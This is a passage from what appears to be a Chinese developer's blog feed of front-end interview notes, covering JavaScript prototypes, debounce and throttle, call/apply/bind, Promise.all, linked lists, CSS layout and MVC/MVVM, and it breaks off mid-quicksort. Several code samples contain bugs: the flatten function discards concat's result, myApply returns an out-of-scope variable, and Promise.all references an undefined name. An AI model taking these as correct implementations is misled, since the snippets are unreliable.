  ClassA 的 prototype 是啥，有啥<br>   classA 的 <strong>proto</strong> 是啥               （ClassA.prototype == classA.proto)<br>   原型链讲一下<br>   instanceof 什么时候返回 true，什么时候返回 false<br>   怎么让 classA instanceof ClassA 返回 false  (改变ClassA.prototype或classA.proto)</p><h2 id="4-数组扁平化带深度参数"><a href="#4-数组扁平化带深度参数" class="headerlink" title="4. 数组扁平化带深度参数"></a>4. 数组扁平化带深度参数</h2></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flattern</span>(<span class="params">list,depth</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> res = []</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">let</span> item <span class="keyword">of</span> list)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(item)&amp;&amp;depth&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                        res.concat(flattern(item,depth<span class="number">-1</span>))</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        res.push(item)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写一个函数，将传进去的数组按深度展开</span></span><br><span class="line">list = [<span class="number">1</span>,<span class="number">2</span>,[<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>,[<span class="number">7</span>,<span class="number">8</span>],<span class="number">9</span>],<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line"><span class="comment">// depth 等于 1 时输出</span></span><br><span class="line"><span class="comment">//depth = 1 :[1,2,3,4,5,6,[7,8],9,10,11]</span></span><br><span class="line"><span class="comment">// depth 等于 2 时输出</span></span><br><span class="line"><span class="comment">//depth = 2 :[1,2,3,4,5,6,7,8,9,10,11]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flattern(list,<span class="number">1</span>))</span><br><span class="line"><span class="built_in">console</span>.log(flattern(list,<span class="number">2</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写代码整理</title>
      <link href="2020/03/20/%E6%95%B4%E7%90%86-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86/"/>
      <url>2020/03/20/%E6%95%B4%E7%90%86-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li>手写节流代码</li><li>手写防抖代码</li><li>手写柯里化</li><li>手写apply,bind,call</li><li>手写promise.all</li><li>手写promise.race</li></ul><a id="more"></a><h2 id="1-防抖"><a href="#1-防抖" class="headerlink" title="1.防抖"></a>1.防抖</h2><p><strong>在第一次触发事件时，不立即执行函数，而是给出一个期限值比如200ms</strong>，然后：</p><ul><li>如果在200ms内没有再次触发滚动事件，那么就执行函数</li><li>如果在200ms内再次触发滚动事件，那么当前的计时取消，重新开始计时</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//防抖debounce</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn,delay</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span> <span class="comment">//借助闭包</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(timer)&#123;</span><br><span class="line">            clearTimeout(timer) </span><br><span class="line">        &#125;</span><br><span class="line">        timer = setTimeout(fn,delay) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">out</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"防抖"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onscroll = debounce(out,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h2 id="2-节流"><a href="#2-节流" class="headerlink" title="2.节流"></a>2.节流</h2><p>如果短时间内大量触发同一事件，那么<strong>在函数执行一次之后，该函数在指定的时间期限内不再工作</strong>，直至过了这段时间才重新生效。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn,delay</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> flag = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span> </span><br><span class="line">       &#125;</span><br><span class="line">        flag = <span class="literal">false</span></span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            fn()</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;, delay)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">out</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"防抖"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onscroll = throttle(out,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//柯里化</span></span><br><span class="line"><span class="keyword">let</span> curry = <span class="function">(<span class="params">fn,...args</span>)=&gt;</span></span><br><span class="line">    args.length&lt;fn.length</span><br><span class="line">        ?<span class="function">(<span class="params">...<span class="built_in">arguments</span></span>)=&gt;</span>curry(fn,...args,...arguments)</span><br><span class="line">        :fn(...args)</span><br><span class="line"><span class="comment">//apply</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">thisArg,rest</span>)</span>&#123;</span><br><span class="line">    thisArg = thisArg || <span class="built_in">window</span></span><br><span class="line">    thisArg.func = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">if</span>(!rest)&#123;</span><br><span class="line">        <span class="keyword">let</span> result = thisArg.func()</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> result = thisArg.func(...rest)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> thisArg.func</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//call</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> [thisArg,...args] = [...arguments]</span><br><span class="line">    thisArg = thisArg || <span class="built_in">window</span></span><br><span class="line">    thisArg.func = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">let</span> result = thisArg.func(...args)</span><br><span class="line">    <span class="keyword">delete</span> thisArg.func</span><br><span class="line">    <span class="keyword">return</span> result </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bind</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> [thisArg,...args] = [...arguments]</span><br><span class="line">    <span class="keyword">let</span> that = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> that.call(thisArg,...args,...arguments)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//promise.all</span></span><br><span class="line"><span class="built_in">Promise</span>.all = <span class="function"><span class="keyword">function</span>(<span class="params">promises</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> result = []</span><br><span class="line">        <span class="keyword">let</span> len = promises.length</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(len==<span class="number">0</span>)&#123;</span><br><span class="line">            resolve(result)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="built_in">Promise</span>.resolve(promise[i]).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">                result[i] = res</span><br><span class="line">                index++</span><br><span class="line">                <span class="keyword">if</span>(index==len)&#123;</span><br><span class="line">                    resolve(result)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;</span><br><span class="line">                reject(err)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//promise.race</span></span><br><span class="line"><span class="built_in">Promise</span>.race = <span class="function"><span class="keyword">function</span>(<span class="params">promises</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> len = promises.length</span><br><span class="line">        <span class="keyword">if</span>(len==<span class="number">0</span>) <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="built_in">Promise</span>.resolve(promises[i]).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">                resolve(res)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;</span><br><span class="line">                reject(err)</span><br><span class="line">                <span class="keyword">return</span> </span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.19</title>
      <link href="2020/03/19/%E6%97%A5%E5%B8%B8-2020.3.19/"/>
      <url>2020/03/19/%E6%97%A5%E5%B8%B8-2020.3.19/</url>
      
        <content type="html"><![CDATA[<ul><li><p>cooike和session的区别</p></li><li><p>html5的一些标签</p></li><li>数组和链表的对比</li><li>链表反转</li><li>给一个链表，输出链表中倒数第k个结点</li><li>输入两个单增的链表，合并后新链表单调不减</li><li>轮播图怎么实现</li><li>设计模式你了解哪些</li><li>项目中你遇到了哪些坑</li></ul><a id="more"></a><h2 id="1-cooike和session的区别"><a href="#1-cooike和session的区别" class="headerlink" title="1.cooike和session的区别"></a>1.cooike和session的区别</h2><p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了 。</p><h2 id="2-html5的一些标签"><a href="#2-html5的一些标签" class="headerlink" title="2.html5的一些标签"></a>2.html5的一些标签</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;header&gt;:定义区段或页面的页眉.(头部)</span><br><span class="line">&lt;footer&gt;:定义区段或页面的页脚.(足部)</span><br><span class="line">&lt;section&gt;:定义文档中的区段.</span><br><span class="line">&lt;article&gt;:定义文章.</span><br><span class="line">&lt;aside&gt;:定义页面内容之外的内容.</span><br><span class="line">&lt;details&gt;:定义元素的细节.</span><br><span class="line">&lt;audio&gt;:定义声音内容.</span><br><span class="line">&lt;video&gt;:定义视频.</span><br><span class="line">&lt;iframe&gt;:内联框架.</span><br></pre></td></tr></table></figure><h2 id="3-数组和链表的对比"><a href="#3-数组和链表的对比" class="headerlink" title="3.数组和链表的对比"></a>3.数组和链表的对比</h2><p>数组存储方式采用线性结构，声明数组时需要声明类型，并且大小也会固定：</p><ul><li>优点：</li></ul><p>　　　　因此访问数组元素可根据数组下标随机访问，O(1).</p><ul><li>缺点：</li></ul><p>　　　　大小固定，可能会造成空间浪费，或空间不够影响程序运行；</p><p>　　　　插入和删除元素却比较麻烦，可能需要移动部分数组元素以保证数组元素的物理位置保持连续。</p><p>链表采用链式存储结构，在声明时只需声明结构类型，：</p><ul><li>优点：</li></ul><p>　　　　链表大小在实际使用中可以动态增大和减小；</p><p>　　　　插入和删除操作就很方便，只需修改该元素节点邻接元素即可O(1).</p><ul><li>缺点：</li></ul><p>　　　　访问元素比较费时，需要逐个节点进行查看或能找到目标元素。</p><h2 id="4-链表反转"><a href="#4-链表反转" class="headerlink" title="4.链表反转"></a>4.链表反转</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Reverse</span>(<span class="params">p</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pre=<span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> next=<span class="literal">null</span></span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">null</span>)&#123;</span><br><span class="line">        next=p.next</span><br><span class="line">        p.next=pre <span class="comment">//反转指针</span></span><br><span class="line">        pre=p      </span><br><span class="line">        p=next</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-给一个链表，输出链表中倒数第k个结点"><a href="#5-给一个链表，输出链表中倒数第k个结点" class="headerlink" title="5.给一个链表，输出链表中倒数第k个结点"></a>5.给一个链表，输出链表中倒数第k个结点</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = []</span><br><span class="line"><span class="keyword">while</span>(head)&#123;</span><br><span class="line">    arr.unshift(head)</span><br><span class="line">    head=head.next</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> arr[k<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h2 id="6-输入两个单增的链表，合并后新链表单调不减"><a href="#6-输入两个单增的链表，合并后新链表单调不减" class="headerlink" title="6.输入两个单增的链表，合并后新链表单调不减"></a>6.输入两个单增的链表，合并后新链表单调不减</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">pHead1,pHead2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(pHead1==<span class="literal">null</span>) <span class="keyword">return</span> pHead2</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pHead2==<span class="literal">null</span>) <span class="keyword">return</span> pHead1</span><br><span class="line">    <span class="keyword">let</span> result =[]</span><br><span class="line">    <span class="keyword">if</span>(pHead1.val&lt;pHead2.val)&#123;</span><br><span class="line">        result = pHead1</span><br><span class="line">        result.next = merge(pHead1.next,pHead2)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = pHead2</span><br><span class="line">        result.next = merge(pHead1,pHead2.next)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-怎么实现轮播图"><a href="#7-怎么实现轮播图" class="headerlink" title="7. 怎么实现轮播图"></a>7. 怎么实现轮播图</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 若果有在等待的定时器，则清掉</span></span><br><span class="line"><span class="keyword">if</span> (timer) &#123;</span><br><span class="line">    clearInterval(timer);</span><br><span class="line">    timer = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自动切换</span></span><br><span class="line">timer = setInterval(autoPlay, <span class="number">4000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义自动播放函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoPlay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    index++;</span><br><span class="line">    <span class="keyword">if</span> (list.length &lt;=index) &#123;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    changeImg(index);</span><br><span class="line">    <span class="comment">// alert("我正在autoplay");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义图片切换函数（根据当前的index值也就是curindex）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeImg</span>(<span class="params">curIndex</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; list.length; j++) &#123;</span><br><span class="line">        list[j].className = <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 改变当前显示索引</span></span><br><span class="line">    list[curIndex].className = <span class="string">"on"</span>;</span><br><span class="line">    pic.style.marginLeft = <span class="number">-1920</span> * curIndex + <span class="string">"px"</span>;</span><br><span class="line">    index = curIndex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标划过整个容器时停止自动播放</span></span><br><span class="line">wrap.onmouseover = <span class="function"><span class="keyword">function</span>(<span class="params">curIndex</span>) </span>&#123;</span><br><span class="line">    clearInterval(timer);</span><br><span class="line">    <span class="comment">//点击右按钮</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标离开整个容器时继续播放至下一张</span></span><br><span class="line">wrap.onmouseout = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    timer = setInterval(autoPlay, <span class="number">4000</span>);</span><br><span class="line">    <span class="comment">// alert("鼠标移走了");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有数字导航实现划过切换至对应的图片</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">    list[i].id = i;</span><br><span class="line">    list[i].onmouseover = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clearInterval(timer);</span><br><span class="line">        changeImg(<span class="keyword">this</span>.id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-设计模式"><a href="#8-设计模式" class="headerlink" title="8. 设计模式"></a>8. 设计模式</h2><ul><li>单例模式（Singleton）：又称为单体模式，是只允许实例化一次的对象类。有时我们也用一个对象来规划一个命名空间，井井有条地管理对象上的属性与方法。 </li><li>简单工厂模式：又叫静态工厂方法，由一个工厂对象决定创建某一种产品对象类的实例。主要用来创建同一类对象。 </li><li>工厂方法模式（Factory Method）：通过对产品类的抽象使其创建业务主要负责用于创建多类产品的实例。 </li><li>抽象工厂模式：通过对类的工厂抽象使其业务用于对产品类簇的创建，而不负责创建某一类产品的实例。 </li><li>建造者模式（Builder：将一个复杂对象的构建层与其表示层相互分离，同样的构建过程可采用不同的表示。 </li></ul><h2 id="9-项目中遇到过那些坑"><a href="#9-项目中遇到过那些坑" class="headerlink" title="9. 项目中遇到过那些坑"></a>9. 项目中遇到过那些坑</h2><ul><li>for循环给li设置点击事件，闭包，let</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.16</title>
      <link href="2020/03/16/%E6%97%A5%E5%B8%B8-2020.3.16/"/>
      <url>2020/03/16/%E6%97%A5%E5%B8%B8-2020.3.16/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是脱离文档流，定位与浮动</li><li>值类型与引用类型，堆和栈</li><li>MVC与MVVM</li></ul><a id="more"></a><h2 id="1-什么是脱离文档流，定位与浮动"><a href="#1-什么是脱离文档流，定位与浮动" class="headerlink" title="1.什么是脱离文档流，定位与浮动"></a>1.什么是脱离文档流，定位与浮动</h2><p>所谓的<strong>文档流</strong>，指的是元素排版布局过程中，元素会自动从左往右，从上往下的流式排列。</p><p><strong>脱离文档流</strong>，也就是将元素从普通的布局排版中拿走，其他盒子在定位的时候，会当做脱离文档流的元素不存在而进行定位。</p><p><strong>浮动 ( float ) 和绝对定位 ( position:absolute )</strong> </p><p>（1）均脱离文档流</p><p>（2）均不占位</p><p>（3）浮动情况下，其他元素会自动在其右边排列。绝对定位会完全忽视其存在。</p><h2 id="2-值类型与引用类型，堆和栈"><a href="#2-值类型与引用类型，堆和栈" class="headerlink" title="2.值类型与引用类型，堆和栈"></a>2.值类型与引用类型，堆和栈</h2><ul><li>undefined null number string boolean symbol 属于值类型，object array function 属于引用类型 </li><li>值类型存储在栈中，引用类型存储在堆中。</li><li>值类型有固定的大小和值，存放在栈中，而引用类型不确定大小，但是其引用地址是固定的，因此，它的地址存在栈中，指向存在堆中的对象。 </li><li>值类型不可添加属性和方法，而引用类型可以添加属性和方法 </li><li>值类型比较只要相等，就可以用==或者===来比较，但是引用类型，即使let s = {};let s1 = {};但他们的内存地址不一样，比较依然不相等。</li><li>stack为自动分配的内存空间，它由系统自动释放；而heap则是动态分配的内存，大小不定也不会自动释放。  </li></ul><p><img src="https://upload-images.jianshu.io/upload_images/2295405-2012a343e5e0c162.png?imageMogr2/auto-orient/strip|imageView2/2/w/423/format/webp" alt="1"></p><h2 id="3-MVC与MVVM"><a href="#3-MVC与MVVM" class="headerlink" title="3.MVC与MVVM"></a>3.MVC与MVVM</h2><p>（1）MVC的定义：MVC是Model-View- Controller的简写。即模型-视图-控制器。 </p><ul><li>Model（模型）表示应用程序核心（如数据库）。</li><li>View（视图）显示效果（HTML页面）。</li><li>Controller（控制器）处理输入（业务逻辑）。 </li></ul><p>（2）MVVM是Model-View-ViewModel的简写。即模型-视图-视图模型。是MVC的升级版</p><ul><li>【模型】指的是后端传递的数据。</li><li>【视图】指的是所看到的页面。</li><li>【视图模型】mvvm模式的核心，它是连接view和model的桥梁。它有两个方向，也就是常说的双向绑定。 </li></ul><p>（3）在以前传统的开发模式当中即MVC模式，前端人员只负责MVC当中的View（视图）部分，写好页面交由后端创建渲染模板并提供数据，随着MVVM模式的出现前端已经可以自己写业务逻辑以及渲染模板，后端只负责数据即可，前端所能做的事情越来越多。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.11</title>
      <link href="2020/03/11/%E6%97%A5%E5%B8%B8-2020.3.11/"/>
      <url>2020/03/11/%E6%97%A5%E5%B8%B8-2020.3.11/</url>
      
        <content type="html"><![CDATA[<ul><li>算法：手写快排</li><li>看一遍之前Node.js的博客</li><li>Node.js串口通信与计步算法</li><li>关于WebSocket</li><li>关于前端性能优化</li><li>前端与编译原理</li></ul><a id="more"></a><h2 id="1-算法：手写快排"><a href="#1-算法：手写快排" class="headerlink" title="1.算法：手写快排"></a>1.算法：手写快排</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//快排的基本思想是分治，选择一个枢纽，小的放它左面，大的右面，这样pivot放在了最终位置</span></span><br><span class="line">            <span class="comment">//然后再对pivot左右两个子表排序</span></span><br><span class="line">            <span class="comment">//下面为一趟排序过程，以4为枢纽</span></span><br><span class="line">            <span class="keyword">let</span> arr = [<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>]</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> low=<span class="number">0</span></span><br><span class="line">                <span class="keyword">let</span> high=arr.length<span class="number">-1</span></span><br><span class="line">                <span 